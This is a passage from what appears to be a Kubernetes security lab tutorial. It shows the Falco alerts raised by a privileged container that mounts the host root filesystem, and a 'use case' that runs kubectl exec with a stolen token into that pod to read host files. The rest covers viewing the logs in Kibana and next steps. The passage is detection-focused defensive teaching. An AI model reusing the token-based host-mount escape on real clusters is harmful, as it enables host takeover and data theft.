{"output":"18:40:57.256690969: Notice Container with sensitive mount started (user=root user_loginuid=-1 command=sleep 300000000 k8s.ns=dev k8s.pod=alpine container=4c28a2b97d1f image=alpine:latest mounts=/:/mnt::true:rslave,/var/lib/kubelet/pods/04c59dfa-b08c-450d-81bb-48205b92cbc5/volumes/kubernetes.io~secret/default-token-xqql4:/var/run/secrets/kubernetes.io/serviceaccount:ro:false:rprivate,/var/lib/kubelet/pods/04c59dfa-b08c-450d-81bb-48205b92cbc5/etc-hosts:/etc/hosts::true:rprivate,/var/lib/kubelet/pods/04c59dfa-b08c-450d-81bb-48205b92cbc5/containers/evil/1444a51c:/dev/termination-log::true:rprivate) k8s.ns=dev k8s.pod=alpine container=4c28a2b97d1f k8s.ns=dev k8s.pod=alpine container=4c28a2b97d1f","priority":"Notice","rule":"Launch Sensitive Mount Container","time":"2021-09-15T18:40:57.256690969Z", "output_fields": {"container.id":"4c28a2b97d1f","container.image.repository":"alpine","container.image.tag":"latest","container.mounts":"/:/mnt::true:rslave,/var/lib/kubelet/pods/04c59dfa-b08c-450d-81bb-48205b92cbc5/volumes/kubernetes.io~secret/default-token-xqql4:/var/run/secrets/kubernetes.io/serviceaccount:ro:false:rprivate,/var/lib/kubelet/pods/04c59dfa-b08c-450d-81bb-48205b92cbc5/etc-hosts:/etc/hosts::true:rprivate,/var/lib/kubelet/pods/04c59dfa-b08c-450d-81bb-48205b92cbc5/containers/evil/1444a51c:/dev/termination-log::true:rprivate","evt.time":1631731257256690969,"k8s.ns.name":"dev","k8s.pod.name":"alpine","proc.cmdline":"sleep 300000000","user.loginuid":-1,"user.name":"root"}}
```


## Use case 9 : exec into container

Now that the evil.yaml pod mounted host filesystem from its root we can exec into it and read/write directly on the host.

```bash
root@wordpress-9bb79bb48-fw68x:~# ./kubectl --token=$(cat devops-token) exec -it alpine -- sh
/ # ls /mnt
bin         etc         lib32       lost+found  opt         root.txt    snap        tmp
boot        home        lib64       media       proc        run         srv         usr
dev         lib         libx32      mnt         root        sbin        sys         var
/mnt # cat root.txt 
pawned
```
Detected 

```bash
{"output":"18:44:25.176793748: Notice A shell was spawned in a container with an attached terminal (user=root user_loginuid=-1 k8s.ns=dev k8s.pod=alpine container=4c28a2b97d1f shell=sh parent=runc cmdline=sh terminal=34816 container_id=4c28a2b97d1f image=alpine) k8s.ns=dev k8s.pod=alpine container=4c28a2b97d1f k8s.ns=dev k8s.pod=alpine container=4c28a2b97d1f","priority":"Notice","rule":"Terminal shell in container","time":"2021-09-15T18:44:25.176793748Z", "output_fields": {"container.id":"4c28a2b97d1f","container.image.repository":"alpine","evt.time":1631731465176793748,"k8s.ns.name":"dev","k8s.pod.name":"alpine","proc.cmdline":"sh","proc.name":"sh","proc.pname":"runc","proc.tty":34816,"user.loginuid":-1,"user.name":"root"}}
```
## See Falco logs in Elasticsearch 

1 - Go to your Kibana Dashboard : `Home > Stack Management > Kibana >  Index pattern`
Search : filebeat-7.14.0-*  select it  > create index pattern > chose @timestamp as time index. 

![index pattern](images/index-pattern.png)

2 -  `Home > Discover > select filebeat-7.14.0 index pattern > search query : container.image.name : "falcosecurity/falco:0.29.1" `

![query](images/query.png)

# Next steps ?

Protect DDOS attack : most Cloud provider offer server with DDOS protection to their client, I didn't study how to protect from DDOS attack on a Edge server. Ingress controller is the entrypoint for external users for visiting web app running on the cluster. It's just a reverse proxy redirecting client requests to the different backends in the cluster. It might be good point of investigation. Most ingress controller liek Nginx have configuration file that you can tune.[https://medium.com/@chadsaun/mitigating-a-ddos-attack-with-ingress-nginx-and-kubernetes-12f309072367](https://medium.com/@chadsaun/mitigating-a-ddos-attack-with-ingress-nginx-and-kubernetes-12f309072367)

Response to an incident ? ==> How to respond to a security incident ? ==> Falco Sidekick [falco sidekick github](https://github.com/falcosecurity/falcosidekick)

